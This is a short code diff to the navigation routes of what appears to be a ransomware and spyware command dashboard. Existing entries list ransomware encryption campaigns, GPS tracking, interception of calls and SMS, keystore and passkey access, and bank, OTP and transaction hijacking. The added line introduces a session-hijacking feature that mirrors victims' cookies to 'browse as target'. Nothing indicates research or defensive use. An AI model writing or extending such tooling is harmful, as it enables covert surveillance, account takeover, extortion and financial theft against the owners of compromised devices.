@@ -23,6 +23,7 @@ const ROUTES: PaletteItem[] = [
   { id: "locker",     label: "CryptoLocker",     sub: "AES-256 encryption campaigns",     href: "/locker",    keys: "G C" },
   { id: "devices",    label: "All Devices",       sub: "Real-time device feed (Supabase)",  href: "/devices",   keys: "G V" },
   { id: "map",        label: "Live Map",          sub: "GPS tracker — device locations",    href: "/map",       keys: "G G" },
+  { id: "browser",    label: "Session Browser",   sub: "Mirror device cookies, browse as target", href: "/browser",  keys: "G R" },
   { id: "comms",      label: "Comms Intel",       sub: "Calls, SMS, social media SIGINT",   href: "/comms",     keys: "G C" },
   { id: "biometrics", label: "Biometrics",        sub: "Lock screen, passkeys, keystore",   href: "/biometrics",keys: "G B" },
   { id: "finance",    label: "Finance Intel",     sub: "Wallets, banks, OTP, TX hijack",   href: "/finance",   keys: "G W" },
